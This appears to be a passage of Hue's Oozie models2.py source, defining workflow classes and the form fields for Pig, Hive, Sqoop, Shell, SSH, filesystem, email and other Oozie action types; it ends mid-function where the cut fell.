"apps/oozie/src/oozie/models2.py/n/n#!/usr/bin/env python\n# Licensed to Cloudera, Inc. under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  Cloudera, Inc. licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport json\nimport logging\nimport re\nimport time\nimport uuid\n\nfrom datetime import datetime, timedelta\nfrom dateutil.parser import parse\nfrom string import Template\n\nfrom django.utils.encoding import force_unicode\nfrom desktop.lib.json_utils import JSONEncoderForHTML\nfrom django.utils.translation import ugettext as _\n\nfrom desktop.lib import django_mako\nfrom desktop.models import Document2\n\nfrom hadoop.fs.hadoopfs import Hdfs\nfrom liboozie.submission2 import Submission\nfrom liboozie.submission2 import create_directories\n\nfrom oozie.conf import REMOTE_SAMPLE_DIR\nfrom oozie.models import Workflow as OldWorflows\nfrom oozie.utils import utc_datetime_format\n\n\nLOG = logging.getLogger(__name__)\n\n\nclass Job(object):\n  \n  def find_all_parameters(self, with_lib_path=True):\n    params = self.find_parameters()\n\n    for param in self.parameters:\n      params[param['name'].strip()] = param['value']\n\n    return  [{'name': name, 'value': value} for name, value in params.iteritems() if with_lib_path or name != 'oozie.use.system.libpath']  \n\n  @classmethod\n  def get_workspace(cls, user):\n    return REMOTE_SAMPLE_DIR.get().replace('$USER', user.username).replace('$TIME', str(time.time()))\n\n  @property\n  def validated_name(self):\n    good_name = []\n\n    for c in self.name[:40]:\n      if not good_name:\n        if not re.match('[a-zA-Z_]', c):\n          c = '_'\n      else:\n        if not re.match('[\\-_a-zA-Z0-9]', c):        \n          c = '_'\n      good_name.append(c)\n      \n    return ''.join(good_name)\n\n\nclass Workflow(Job):\n  XML_FILE_NAME = 'workflow.xml'\n  PROPERTY_APP_PATH = 'oozie.wf.application.path'\n  SLA_DEFAULT = [\n      {'key': 'enabled', 'value': False},\n      {'key': 'nominal-time', 'value': ''},\n      {'key': 'should-start', 'value': ''},\n      {'key': 'should-end', 'value': ''},\n      {'key': 'max-duration', 'value': ''},\n      {'key': 'alert-events', 'value': ''},\n      {'key': 'alert-contact', 'value': ''},\n      {'key': 'notification-msg', 'value': ''},\n      {'key': 'upstream-apps', 'value': ''},\n  ]\n  HUE_ID = 'hue-id-w'\n  \n  def __init__(self, data=None, document=None, workflow=None):\n    self.document = document\n\n    if document is not None:\n      self.data = document.data\n    elif data is not None:\n      self.data = data\n    else:\n      self.data = json.dumps({\n          'layout': [{\n              \"size\":12, \"rows\":[\n                  {\"widgets\":[{\"size\":12, \"name\":\"Start\", \"id\":\"3f107997-04cc-8733-60a9-a4bb62cebffc\", \"widgetType\":\"start-widget\", \"properties\":{}, \"offset\":0, \"isLoading\":False, \"klass\":\"card card-widget span12\"}]},\n                  {\"widgets\":[{\"size\":12, \"name\":\"End\", \"id\":\"33430f0f-ebfa-c3ec-f237-3e77efa03d0a\", \"widgetType\":\"end-widget\", \"properties\":{}, \"offset\":0, \"isLoading\":False, \"klass\":\"card card-widget span12\"}]},\n                  {\"widgets\":[{\"size\":12, \"name\":\"Kill\", \"id\":\"17c9c895-5a16-7443-bb81-f34b30b21548\", \"widgetType\":\"kill-widget\", \"properties\":{}, \"offset\":0, \"isLoading\":False, \"klass\":\"card card-widget span12\"}]}\n              ],\n              \"drops\":[ \"temp\"],\n              \"klass\":\"card card-home card-column span12\"\n          }],\n          'workflow': workflow if workflow is not None else {\n              \"id\": None, \n              \"uuid\": None,\n              \"name\": \"My Workflow\",\n              \"properties\": {\n                  \"description\": \"\",\n                  \"job_xml\": \"\",\n                  \"sla_enabled\": False,\n                  \"schema_version\": \"uri:oozie:workflow:0.5\",\n                  \"sla_workflow_enabled\": False,\n                  \"credentials\": [],\n                  \"properties\": [],\n                  \"sla\": Workflow.SLA_DEFAULT,\n                  \"show_arrows\": True,\n              },\n              \"nodes\":[\n                  {\"id\":\"3f107997-04cc-8733-60a9-a4bb62cebffc\",\"name\":\"Start\",\"type\":\"start-widget\",\"properties\":{},\"children\":[{'to': '33430f0f-ebfa-c3ec-f237-3e77efa03d0a'}]},            \n                  {\"id\":\"33430f0f-ebfa-c3ec-f237-3e77efa03d0a\",\"name\":\"End\",\"type\":\"end-widget\",\"properties\":{},\"children\":[]},\n                  {\"id\":\"17c9c895-5a16-7443-bb81-f34b30b21548\",\"name\":\"Kill\",\"type\":\"kill-widget\",\"properties\":{'message': _('Action failed, error message[${wf:errorMessage(wf:lastErrorNode())}]')},\"children\":[]}\n              ]\n          }\n      })\n      \n  @property\n  def id(self):\n    return self.document.id  \n  \n  @property\n  def uuid(self):\n    return self.document.uuid   \n  \n  def get_json(self):\n    _data = self.get_data()\n\n    return json.dumps(_data)\n \n  def get_data(self):\n    _data = json.loads(self.data)\n    \n    if self.document is not None:\n      _data['workflow']['id'] = self.document.id\n      _data['workflow']['dependencies'] = list(self.document.dependencies.values('uuid',))\n    else:\n      _data['workflow']['dependencies'] = []\n\n    if 'parameters' not in _data['workflow']['properties']:\n      _data['workflow']['properties']['parameters'] = [\n          {'name': 'oozie.use.system.libpath', 'value': True},\n      ]\n    if 'show_arrows' not in _data['workflow']['properties']:\n      _data['workflow']['properties']['show_arrows'] = True\n\n    return _data\n  \n  def to_xml(self, mapping=None):\n    if mapping is None:\n      mapping = {}\n    tmpl = 'editor/gen2/workflow.xml.mako'\n\n    data = self.get_data()\n    nodes = [node for node in self.nodes if node.name != 'End'] + [node for node in self.nodes if node.name == 'End'] # End at the end\n    node_mapping = dict([(node.id, node) for node in nodes])\n    \n    sub_wfs_ids = [node.data['properties']['workflow'] for node in nodes if node.data['type'] == 'subworkflow']\n    workflow_mapping = dict([(workflow.uuid, Workflow(document=workflow)) for workflow in Document2.objects.filter(uuid__in=sub_wfs_ids)])\n\n    xml = re.sub(re.compile('\\s*\\n+', re.MULTILINE), '\\n', django_mako.render_to_string(tmpl, {\n              'wf': self,\n              'workflow': data['workflow'],\n              'nodes': nodes,\n              'mapping': mapping,\n              'node_mapping': node_mapping,\n              'workflow_mapping': workflow_mapping\n          }))\n    return force_unicode(xml)\n\n  @property\n  def name(self):\n    _data = self.get_data()\n    return _data['workflow']['name']\n  \n  def update_name(self, name):\n    _data = self.get_data()\n    _data['workflow']['name'] = name\n    self.data = json.dumps(_data)  \n\n  @property      \n  def deployment_dir(self):\n    _data = self.get_data()\n    return _data['workflow']['properties']['deployment_dir']\n  \n  @property      \n  def parameters(self):\n    _data = self.get_data()\n    return _data['workflow']['properties']['parameters']\n\n  @property      \n  def sla_enabled(self):\n    _data = self.get_data()\n    return _data['workflow']['properties']['sla_enabled']\n\n  @property      \n  def sla(self):\n    _data = self.get_data()\n    return _data['workflow']['properties']['sla']\n\n  @property      \n  def nodes(self):\n    _data = self.get_data()\n    return [Node(node) for node in _data['workflow']['nodes']]\n\n  def find_parameters(self):\n    params = set()\n\n    if self.sla_enabled:\n      for param in find_json_parameters(self.sla):\n        params.add(param)\n\n    for node in self.nodes:\n      params.update(node.find_parameters())\n\n    return dict([(param, '') for param in list(params)])\n\n  def set_workspace(self, user):\n    _data = json.loads(self.data)\n\n    _data['workflow']['properties']['deployment_dir'] = Job.get_workspace(user)\n    \n    self.data = json.dumps(_data)\n\n  def check_workspace(self, fs, user):\n    # Create optional root workspace for the first submission    \n    root = REMOTE_SAMPLE_DIR.get().rsplit('/', 1)\n    if len(root) > 1 and '$' not in root[0]:      \n      create_directories(fs, [root[0]])\n\n    Submission(user, self, fs, None, {})._create_dir(self.deployment_dir)\n    Submission(user, self, fs, None, {})._create_dir(Hdfs.join(self.deployment_dir, 'lib'))\n\n\nclass Node():\n  def __init__(self, data):    \n    self.data = data\n    \n    self._augment_data()\n    \n  def to_xml(self, mapping=None, node_mapping=None, workflow_mapping=None):\n    if mapping is None:\n      mapping = {}\n    if node_mapping is None:\n      node_mapping = {}\n    if workflow_mapping is None:\n      workflow_mapping = {}\n\n    data = {\n      'node': self.data,\n      'mapping': mapping,\n      'node_mapping': node_mapping,\n      'workflow_mapping': workflow_mapping\n    }\n\n    return django_mako.render_to_string(self.get_template_name(), data)\n\n  @property      \n  def id(self):\n    return self.data['id']\n  \n  @property      \n  def name(self):\n    return self.data['name']\n\n  @property      \n  def sla_enabled(self):\n    _data = self.get_data()\n    return _data['workflow']['properties']['sla_enabled']\n\n  def _augment_data(self):\n    self.data['type'] = self.data['type'].replace('-widget', '')\n    self.data['uuid'] = self.data['id']\n    \n    # Action Node\n    if 'credentials' not in self.data['properties']:\n      self.data['properties']['credentials'] = []     \n    if 'prepares' not in self.data['properties']:\n      self.data['properties']['prepares'] = []\n    if 'job_xml' not in self.data['properties']:\n      self.data['properties']['job_xml'] = []      \n    if 'properties' not in self.data['properties']:\n      self.data['properties']['properties'] = []\n    if 'params' not in self.data['properties']:\n      self.data['properties']['params'] = []\n    if 'files' not in self.data['properties']:\n      self.data['properties']['files'] = []\n    if 'archives' not in self.data['properties']:\n      self.data['properties']['archives'] = []\n    if 'sla_enabled' not in self.data['properties']:\n      self.data['properties']['sla_enabled'] = False\n    if 'sla' not in self.data['properties']:\n      self.data['properties']['sla'] = []\n    \n  def get_template_name(self):\n    return 'editor/gen2/workflow-%s.xml.mako' % self.data['type']    \n\n  def find_parameters(self):\n    return find_parameters(self)    \n\n\nclass Action(object):\n  \n  @classmethod\n  def get_fields(cls):\n    return [(f['name'], f['value']) for f in cls.FIELDS.itervalues()] + [('sla', Workflow.SLA_DEFAULT), ('credentials', [])]\n\n\nclass StartNode(Action):\n  TYPE = 'start'\n  FIELDS = {}\n\n\nclass EndNode(Action):\n  TYPE = 'end'\n  FIELDS = {}\n\n\nclass PigAction(Action):\n  TYPE = 'pig'\n  FIELDS = {\n     'script_path': { \n          'name': 'script_path',\n          'label': _('Script'),\n          'value': '',\n          'help_text': _('Path to the script on HDFS.'),\n          'type': ''\n     },            \n     'parameters': { \n          'name': 'parameters',\n          'label': _('Parameters'),\n          'value': [],\n          'help_text': _('The Pig parameters of the script without -param. e.g. INPUT=${inputDir}'),\n          'type': ''\n     },\n     'arguments': { \n          'name': 'arguments',\n          'label': _('Arguments'),\n          'value': [],\n          'help_text': _('The Pig parameters of the script as is. e.g. -param, INPUT=${inputDir}'),\n          'type': ''\n     },\n     # Common\n     'files': { \n          'name': 'files',\n          'label': _('Files'),\n          'value': [],\n          'help_text': _('Files put in the running directory.'),\n          'type': ''\n     },\n     'archives': { \n          'name': 'archives',\n          'label': _('Archives'),\n          'value': [],\n          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),\n          'type': ''\n     },\n     'job_properties': { \n          'name': 'job_properties',\n          'label': _('Hadoop job properties'),\n          'value': [],\n          'help_text': _('value, e.g. production'),\n          'type': ''\n     },\n     'prepares': { \n          'name': 'prepares',\n          'label': _('Prepares'),\n          'value': [],\n          'help_text': _('Path to manipulate before starting the application.'),\n          'type': ''\n     },\n     'job_xml': { \n          'name': 'job_xml',\n          'label': _('Job XML'),\n          'value': [],\n          'help_text': _('Refer to a Hadoop JobConf job.xml'),\n          'type': ''\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['script_path']]\n\n\nclass JavaAction(Action):\n  TYPE = 'java'\n  FIELDS = {\n     'jar_path': { \n          'name': 'jar_path',\n          'label': _('Jar name'),\n          'value': '',\n          'help_text': _('Path to the jar on HDFS.'),\n          'type': ''\n     },            \n     'main_class': { \n          'name': 'main_class',\n          'label': _('Main class'),\n          'value': '',\n          'help_text': _('Java class. e.g. org.apache.hadoop.examples.Grep'),\n          'type': 'text'\n     },\n     'arguments': { \n          'name': 'arguments',\n          'label': _('Arguments'),\n          'value': [],\n          'help_text': _('Arguments of the main method. The value of each arg element is considered a single argument '\n                         'and they are passed to the main method in the same order.'),\n          'type': ''\n     },\n     'java_opts': { \n          'name': 'java_opts',\n          'label': _('Java options'),\n          'value': [],\n          'help_text': _('Parameters for the JVM, e.g. -Dprop1=a -Dprop2=b'),\n          'type': ''\n     },\n     'capture_output': { \n          'name': 'capture_output',\n          'label': _('Capture output'),\n          'value': False,\n          'help_text': _('Capture output of the stdout of the %(program)s command execution. The %(program)s '\n                         'command output must be in Java Properties file format and it must not exceed 2KB. '\n                         'From within the workflow definition, the output of an %(program)s action node is accessible '\n                         'via the String action:output(String node, String key) function') % {'program': TYPE.title()},\n          'type': ''\n     },\n     # Common\n     'files': { \n          'name': 'files',\n          'label': _('Files'),\n          'value': [],\n          'help_text': _('Files put in the running directory.'),\n          'type': ''\n     },\n     'archives': { \n          'name': 'archives',\n          'label': _('Archives'),\n          'value': [],\n          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),\n          'type': ''\n     },\n     'job_properties': { \n          'name': 'job_properties',\n          'label': _('Hadoop job properties'),\n          'value': [],\n          'help_text': _('value, e.g. production'),\n          'type': ''\n     },\n     'prepares': { \n          'name': 'prepares',\n          'label': _('Prepares'),\n          'value': [],\n          'help_text': _('Path to manipulate before starting the application.'),\n          'type': ''\n     },\n     'job_xml': { \n          'name': 'job_xml',\n          'label': _('Job XML'),\n          'value': [],\n          'help_text': _('Refer to a Hadoop JobConf job.xml'),\n          'type': ''\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['jar_path'], cls.FIELDS['main_class']]\n  \n  \nclass HiveAction(Action):\n  TYPE = 'hive'\n  FIELDS = {\n     'script_path': { \n          'name': 'script_path',\n          'label': _('Script'),\n          'value': '',\n          'help_text': _('Path to the script on HDFS.'),\n          'type': ''\n     },            \n     'parameters': { \n          'name': 'parameters',\n          'label': _('Parameters'),\n          'value': [],\n          'help_text': _('The %(type)s parameters of the script. E.g. N=5, INPUT=${inputDir}')  % {'type': TYPE.title()},\n          'type': ''\n     },\n     # Common\n     'files': { \n          'name': 'files',\n          'label': _('Files'),\n          'value': [],\n          'help_text': _('Files put in the running directory.'),\n          'type': ''\n     },\n     'archives': { \n          'name': 'archives',\n          'label': _('Archives'),\n          'value': [],\n          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),\n          'type': ''\n     },\n     'job_properties': { \n          'name': 'job_properties',\n          'label': _('Hadoop job properties'),\n          'value': [],\n          'help_text': _('value, e.g. production'),\n          'type': ''\n     },\n     'prepares': { \n          'name': 'prepares',\n          'label': _('Prepares'),\n          'value': [],\n          'help_text': _('Path to manipulate before starting the application.'),\n          'type': ''\n     },\n     'hive_xml': { \n          'name': 'hive_xml',\n          'label': _('Hive XML'),\n          'value': [],\n          'help_text': _('Refer to a hive-site.xml renamed hive-conf.xml'),\n          'type': ''\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['script_path'], cls.FIELDS['hive_xml']]\n\n\nclass HiveServer2Action(Action):\n  TYPE = 'hive2'\n  FIELDS = {\n     'script_path': { \n          'name': 'script_path',\n          'label': _('Script'),\n          'value': '',\n          'help_text': _('Path to the script on HDFS.'),\n          'type': ''\n     },            \n     'parameters': { \n          'name': 'parameters',\n          'label': _('Parameters'),\n          'value': [],\n          'help_text': _('The %(type)s parameters of the script. E.g. N=5, INPUT=${inputDir}')  % {'type': TYPE.title()},\n          'type': ''\n     },\n     # Common\n     'jdbc_url': { \n          'name': 'jdbc_url',\n          'label': _('JDBC URL'),\n          'value': 'jdbc:hive2://localhost:10000/default',\n          'help_text': _('JDBC URL for the Hive Server 2. Beeline will use this to know where to connect to.'),\n          'type': ''\n     },     \n     'password': { \n          'name': 'password',\n          'label': _('Password'),\n          'value': '',\n          'help_text': _('The password element must contain the password of the current user. However, the password is only used if Hive Server 2 is backed by '\n                         'something requiring a password (e.g. LDAP); non-secured Hive Server 2 or Kerberized Hive Server 2 don\\'t require a password.'),\n          'type': ''\n     },\n     'files': { \n          'name': 'files',\n          'label': _('Files'),\n          'value': [],\n          'help_text': _('Files put in the running directory.'),\n          'type': ''\n     },\n     'archives': { \n          'name': 'archives',\n          'label': _('Archives'),\n          'value': [],\n          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),\n          'type': ''\n     },\n     'job_properties': { \n          'name': 'job_properties',\n          'label': _('Hadoop job properties'),\n          'value': [],\n          'help_text': _('value, e.g. production'),\n          'type': ''\n     },\n     'prepares': { \n          'name': 'prepares',\n          'label': _('Prepares'),\n          'value': [],\n          'help_text': _('Path to manipulate before starting the application.'),\n          'type': ''\n     },\n     'job_xml': { \n          'name': 'job_xml',\n          'label': _('Job XML'),\n          'value': [],\n          'help_text': _('Refer to a Hadoop JobConf job.xml'),\n          'type': ''\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['script_path']]\n\n\nclass SubWorkflowAction(Action):\n  TYPE = 'subworkflow'\n  FIELDS = {\n     'workflow': { \n          'name': 'workflow',\n          'label': _('Sub-workflow'),\n          'value': None,\n          'help_text': _('The sub-workflow application to include. You must own all the sub-workflows'),\n          'type': 'workflow'\n     },\n     'propagate_configuration': { \n          'name': 'propagate_configuration',\n          'label': _('Propagate configuration'),\n          'value': True,\n          'help_text': _('If the workflow job configuration should be propagated to the child workflow.'),\n          'type': ''\n     },\n     'job_properties': { \n          'name': 'job_properties',\n          'label': _('Hadoop job properties'),\n          'value': [],\n          'help_text': _('Can be used to specify the job properties that are required to run the child workflow job.'),\n          'type': ''\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['workflow']] \n\n\nclass SqoopAction(Action):\n  TYPE = 'sqoop'\n  FIELDS = {\n     'command': { \n          'name': 'command',\n          'label': _('Sqoop command'),\n          'value': 'import  --connect jdbc:hsqldb:file:db.hsqldb --table TT --target-dir hdfs://localhost:8020/user/foo -m 1',\n          'help_text': _('The full %(type)s command. Either put it here or split it by spaces and insert the parts as multiple parameters below.') % {'type': TYPE},\n          'type': 'textarea'\n     },            \n     'parameters': { \n          'name': 'parameters',\n          'label': _('Arguments'),\n          'value': [],\n          'help_text': _('If no command is specified, split the command by spaces and insert the %(type)s parameters '\n                         'here e.g. import, --connect, jdbc:hsqldb:file:db.hsqldb, ...') % {'type': TYPE},\n          'type': ''\n     },\n     # Common\n     'files': { \n          'name': 'files',\n          'label': _('Files'),\n          'value': [],\n          'help_text': _('Files put in the running directory.'),\n          'type': ''\n     },\n     'archives': { \n          'name': 'archives',\n          'label': _('Archives'),\n          'value': [],\n          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),\n          'type': ''\n     },\n     'job_properties': { \n          'name': 'job_properties',\n          'label': _('Hadoop job properties'),\n          'value': [],\n          'help_text': _('value, e.g. production'),\n          'type': ''\n     },\n     'prepares': { \n          'name': 'prepares',\n          'label': _('Prepares'),\n          'value': [],\n          'help_text': _('Path to manipulate before starting the application.'),\n          'type': ''\n     },\n     'job_xml': { \n          'name': 'job_xml',\n          'label': _('Job XML'),\n          'value': [],\n          'help_text': _('Refer to a Hadoop JobConf job.xml'),\n          'type': ''\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['command']]\n\n\nclass MapReduceAction(Action):\n  TYPE = 'mapreduce'\n  FIELDS = {\n     'jar_path': { \n          'name': 'jar_path',\n          'label': _('Jar name'),\n          'value': '',\n          'help_text': _('Path to the jar on HDFS.'),\n          'type': ''\n     },\n     # Common\n     'files': { \n          'name': 'files',\n          'label': _('Files'),\n          'value': [],\n          'help_text': _('Files put in the running directory.'),\n          'type': ''\n     },\n     'archives': { \n          'name': 'archives',\n          'label': _('Archives'),\n          'value': [],\n          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),\n          'type': ''\n     },\n     'job_properties': { \n          'name': 'job_properties',\n          'label': _('Hadoop job properties'),\n          'value': [],\n          'help_text': _('value, e.g. production'),\n          'type': ''\n     },\n     'prepares': { \n          'name': 'prepares',\n          'label': _('Prepares'),\n          'value': [],\n          'help_text': _('Path to manipulate before starting the application.'),\n          'type': ''\n     },\n     'job_xml': { \n          'name': 'job_xml',\n          'label': _('Job XML'),\n          'value': [],\n          'help_text': _('Refer to a Hadoop JobConf job.xml'),\n          'type': ''\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['jar_path']]\n\n\nclass ShellAction(Action):\n  TYPE = 'shell' \n  FIELDS = {\n     'shell_command': { \n          'name': 'shell_command',\n          'label': _('Shell command'),\n          'value': '',\n          'help_text': _('Shell command to execute, e.g script.sh'),\n          'type': ''\n     },            \n     'arguments': {\n          'name': 'arguments',\n          'label': _('Arguments'),\n          'value': [],\n          'help_text': _('One arg, e.g. -l, --help'),\n          'type': ''\n     },    \n     'env_var': { \n          'name': 'env_var',\n          'label': _('Environment variables'),\n          'value': [],\n          'help_text': _('e.g. MAX=10 or PATH=$PATH:mypath'),\n          'type': ''\n     },         \n     'capture_output': { \n          'name': 'capture_output',\n          'label': _('Capture output'),\n          'value': True,\n          'help_text': _('Capture output of the stdout of the %(program)s command execution. The %(program)s '\n                         'command output must be in Java Properties file format and it must not exceed 2KB. '\n                         'From within the workflow definition, the output of an %(program)s action node is accessible '\n                         'via the String action:output(String node, String key) function') % {'program': TYPE},\n          'type': ''\n     },\n     # Common\n     'files': { \n          'name': 'files',\n          'label': _('Files'),\n          'value': [],\n          'help_text': _('Files put in the running directory.'),\n          'type': ''\n     },\n     'archives': { \n          'name': 'archives',\n          'label': _('Archives'),\n          'value': [],\n          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),\n          'type': ''\n     },\n     'job_properties': { \n          'name': 'job_properties',\n          'label': _('Hadoop job properties'),\n          'value': [],\n          'help_text': _('value, e.g. production'),\n          'type': ''\n     },\n     'prepares': { \n          'name': 'prepares',\n          'label': _('Prepares'),\n          'value': [],\n          'help_text': _('Path to manipulate before starting the application.'),\n          'type': ''\n     },\n     'job_xml': { \n          'name': 'job_xml',\n          'label': _('Job XML'),\n          'value': [],\n          'help_text': _('Refer to a Hadoop JobConf job.xml'),\n          'type': ''\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['shell_command']]\n\n\nclass SshAction(Action):\n  TYPE = 'ssh' \n  FIELDS = {\n     'host': { \n          'name': 'host',\n          'label': _('User and Host'),\n          'value': 'user@host.com',\n          'help_text': _('Where the shell will be executed.'),\n          'type': 'text'\n     },         \n     'ssh_command': { \n          'name': 'ssh_command',\n          'label': _('Ssh command'),\n          'value': 'ls',\n          'help_text': _('The path of the Shell command to execute.'),\n          'type': 'textarea'\n     },    \n     'arguments': {\n          'name': 'arguments',\n          'label': _('Arguments'),\n          'value': [],\n          'help_text': _('One arg, e.g. -l, --help'),\n          'type': ''\n     },\n     'capture_output': { \n          'name': 'capture_output',\n          'label': _('Capture output'),\n          'value': True,\n          'help_text': _('Capture output of the stdout of the %(program)s command execution. The %(program)s '\n                         'command output must be in Java Properties file format and it must not exceed 2KB. '\n                         'From within the workflow definition, the output of an %(program)s action node is accessible '\n                         'via the String action:output(String node, String key) function') % {'program': TYPE},\n          'type': ''\n     },\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['host'], cls.FIELDS['ssh_command']]\n\n\nclass FsAction(Action):\n  TYPE = 'fs' \n  FIELDS = {\n     'deletes': { \n          'name': 'deletes',\n          'label': _('Delete path'),\n          'value': [],\n          'help_text': _('Deletes recursively all content.'),\n          'type': ''\n     },\n     'mkdirs': { \n          'name': 'mkdirs',\n          'label': _('Create directory'),\n          'value': [],\n          'help_text': _('Sub directories are created if needed.'),\n          'type': ''\n     },\n     'moves': { \n          'name': 'moves',\n          'label': _('Move file or directory'),\n          'value': [],\n          'help_text': _('Destination.'),\n          'type': ''\n     },  \n     'chmods': { \n          'name': 'chmods',\n          'label': _('Change permissions'),\n          'value': [],\n          'help_text': _('File or directory.'),\n          'type': ''\n     },\n     'touchzs': { \n          'name': 'touchzs',\n          'label': _('Create or touch a file'),\n          'value': [],\n          'help_text': _('Or update its modification date.'),\n          'type': ''\n     },\n     'chgrps': { \n          'name': 'chgrps',\n          'label': _('Change the group'),\n          'value': [],\n          'help_text': _('File or directory.'),\n          'type': ''\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['deletes'], cls.FIELDS['mkdirs'], cls.FIELDS['moves'], cls.FIELDS['chmods']]\n\n\nclass EmailAction(Action):\n  TYPE = 'email' \n  FIELDS = {\n     'to': { \n          'name': 'to',\n          'label': _('To addresses'),\n          'value': '',\n          'help_text': _('Comma-separated values'),\n          'type': 'text'\n     },         \n     'cc': { \n          'name': 'cc',\n          'label': _('Cc addresses (optional)'),\n          'value': '',\n          'help_text': _('Comma-separated values'),\n          'type': 'text'\n     },    \n     'subject': {\n          'name': 'subject',\n          'label': _('Subject'),\n          'value': '',\n          'help_text': _('Plain-text'),\n          'type': 'text'\n     },\n     'body': { \n          'name': 'body',\n          'label': _('Body'),\n          'value': '',\n          'help_text': _('Plain-text'),\n          'type': 'textarea'\n     },\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['to'], cls.FIELDS['subject'], cls.FIELDS['body']]\n\n\nclass StreamingAction(Action):\n  TYPE = 'streaming'\n  FIELDS = {\n     'mapper': { \n          'name': 'mapper',\n          'label': _('Mapper'),\n          'value': '',\n          'help_text': _('The executable/script to be used as mapper.'),\n          'type': ''\n     },\n     'reducer': { \n          'name': 'reducer',\n          'label': _('Reducer'),\n          'value': '',\n          'help_text': _('The executable/script to be used as reducer.'),\n          'type': ''\n     },\n     # Common\n     'files': { \n          'name': 'files',\n          'label': _('Files'),\n          'value': [],\n          'help_text': _('Files put in the running directory.')\n     },\n     'archives': { \n          'name': 'archives',\n          'label': _('Archives'),\n          'value': [],\n          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.')\n     },\n     'job_properties': { \n          'name': 'job_properties',\n          'label': _('Hadoop job properties'),\n          'value': [],\n          'help_text': _('value, e.g. production')\n     },\n     'prepares': { \n          'name': 'prepares',\n          'label': _('Prepares'),\n          'value': [],\n          'help_text': _('Path to manipulate before starting the application.')\n     },\n     'job_xml': { \n          'name': 'job_xml',\n          'label': _('Job XML'),\n          'value': [],\n          'help_text': _('Refer to a Hadoop JobConf job.xml')\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['mapper'], cls.FIELDS['reducer']]\n\n\nclass DistCpAction(Action):\n  TYPE = 'distcp'\n  FIELDS = {\n     'distcp_parameters': { \n          'name': 'distcp_parameters',\n          'label': _('Arguments'),\n          'value': [{'value': ''}, {'value': ''}],\n          'help_text': _('Options first, then source / destination paths'),\n          'type': 'distcp'\n     },\n      # Common\n     'prepares': { \n          'name': 'prepares',\n          'label': _('Prepares'),\n          'value': [],\n          'help_text': _('Path to manipulate before starting the application.')\n     },\n     'job_properties': { \n          'name': 'job_properties',\n          'label': _('Hadoop job properties'),\n          'value': [],\n          'help_text': _('value, e.g. production')\n     },\n     'java_opts': { \n          'name': 'java_opts',\n          'label': _('Java options'),\n          'value': '',\n          'help_text': _('Parameters for the JVM, e.g. -Dprop1=a -Dprop2=b')\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['distcp_parameters']]\n\n\nclass KillAction(Action):\n  TYPE = 'kill'\n  FIELDS = {\n     'message': { \n          'name': 'message',\n          'label': _('Message'),\n          'value': _('Action failed, error message[${wf:errorMessage(wf:lastErrorNode())}]'),\n          'help_text': _('Message to display when the workflow fails. Can contain some EL functions.'),\n          'type': 'textarea'\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['message']]\n\n\nclass JoinAction(Action):\n  TYPE = 'join'\n  FIELDS = {}\n  \n  @classmethod\n  def get_mandatory_fields(cls):\n    return []\n\n\nclass ForkNode(Action):\n  TYPE = 'fork'\n  FIELDS = {}\n  \n  @classmethod\n  def get_mandatory_fields(cls):\n    return []\n\n\nclass DecisionNode(Action):\n  TYPE = 'decision'\n  FIELDS = {}\n  \n  @classmethod\n  def get_mandatory_fields(cls):\n    return []\n  \n\nNODES = {\n  'start-widget': StartNode,\n  'end-widget': EndNode,\n  'pig-widget': PigAction,\n  'java-widget': JavaAction,\n  'hive-widget': HiveAction,\n  'hive2-widget': HiveServer2Action,\n  'sqoop-widget': SqoopAction,\n  'mapreduce-widget': MapReduceAction,  \n  'subworkflow-widget': SubWorkflowAction,\n  'shell-widget': ShellAction,\n  'ssh-widget': SshAction,  \n  'fs-widget': FsAction,\n  'email-widget': EmailAction,\n  'streaming-widget': StreamingAction,\n  'distcp-widget': DistCpAction,  \n  'kill-widget': KillAction,\n  'join-widget': JoinAction,\n  'fork-widget': ForkNode,\n  'decision-widget': DecisionNode,  \n}\n\n\nWORKFLOW_NODE_PROPERTIES = {}\nfor node in NODES.itervalues():\n  WORKFLOW_NODE_PROPERTIES.update(node.FIELDS)\n\n\n\ndef find_parameters(instance, fields=None):\n  \"\"\"Find parameters in the given fields\"\"\"\n  if fields is None:\n    fields = NODES['%s-widget' % instance.data['type']].FIELDS.keys()\n\n  params = []\n  for field in fields:\n    data = instance.data['properties'][field]\n    if field == 'sla' and not instance.sla_enabled:\n      continue\n    if isinstance(data, list):\n      params.extend(find_json_parameters(data))\n    elif isinstance(data, basestring):\n      for match in Template.pattern.finditer(data):\n        name = 